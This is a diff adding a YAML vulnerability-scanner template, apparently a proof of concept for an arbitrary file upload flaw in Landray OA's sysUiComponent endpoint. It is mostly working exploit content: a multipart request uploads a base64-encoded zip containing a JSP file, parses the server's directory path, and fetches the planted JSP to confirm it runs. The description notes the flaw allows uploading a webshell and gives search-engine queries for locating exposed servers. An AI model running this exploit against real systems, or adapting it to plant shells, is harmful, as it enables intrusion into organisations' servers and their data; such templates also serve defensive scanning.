@@ -1,0 +1,52 @@
+id: landray-oa-sysuicomponent-fileupload
+
+info:
+  name: 蓝凌 OA 子部件文件上传
+  author: Pking
+  severity: critical
+  verified: true
+  description: |-
+    介绍:该系统 sysUiComponent 文件存在任意文件上传漏洞，通过此漏洞攻击者可上传webshell木马，远程控制服务器，威胁企业数据安全。
+    fofa: app="Landray-OA系统"
+    zoomeye: app:"蓝凌数字OA"
+  reference:
+    - https://mp.weixin.qq.com/s/xhwmFuItG8ZoiuGrwR5bnw
+  tags: landray,fileupload
+  created: 2023/11/16
+
+set:
+  baseurl: request.url
+  randstr: randomLowercase(12)
+  rboundary: randomInt(800000000, 1000000000)
+  cookie: randomLowercase(48)
+  payload: base64Decode("UEsDBBQAAAAIAEVrcFcd+E8oKAAAACYAAAAIAAAAdGVzdC5qc3CzUVXILy3RKyjKzCvJydNQ8iotLkl0TCwOCE4zNDIyNlLStFZQtQMAUEsDBBQAAAAIAGlrcFdRNnIYHAAAABoAAAANAAAAY29tcG9uZW50LmluactMsTUyMLQ0Mrbg5cpLzE21Tc5ITc7WK6koAQBQSwECHwAUAAAACABFa3BXHfhPKCgAAAAmAAAACAAkAAAAAAAAACAAAAAAAAAAdGVzdC5qc3AKACAAAAAAAAEAGAB3R8xoTRjaAXdHzGhNGNoBRiZA9UIY2gFQSwECHwAUAAAACABpa3BXUTZyGBwAAAAaAAAADQAkAAAAAAAAACAAAABOAAAAY29tcG9uZW50LmluaQoAIAAAAAAAAQAYACmZwpFNGNoBKZnCkU0Y2gF5vhgvSxjaAVBLBQYAAAAAAgACALkAAACVAAAAAAA=")
+rules:
+  r0:
+    request:
+      method: GET
+      path: /sys/ui/sys_ui_component/sysUiComponent.do?method=upload
+    expression: response.status == 200 && response.body.bcontains(b"请上传正确的部件包文件") && response.body.bcontains(b"附件上传中") && response.body.bcontains(b"请上传正确的部件包文件")
+  r1:
+    request:
+      method: POST
+      path: /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"{{randstr}}.zip\"\r\n\
+        Content-Type: application/x-zip-compressed\r\n\
+        \r\n\
+        {{payload}}\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n
+        "
+    expression: response.status == 200 && response.body.bcontains(b"directoryPath") && response.body.bcontains(b"status")
+    output:
+      search: '"\"directoryPath\":\"(?P<pathName>.+?)\",".bsubmatch(response.body)'
+      pathName: search["pathName"]
+  r2:
+    request:
+      method: GET
+      path: /resource/ui-component/{{pathName}}/test.jsp
+    expression: response.status == 200 && response.body.bcontains(b"JustaAasPSf12232")
+expression: r0() && r1() && r2()
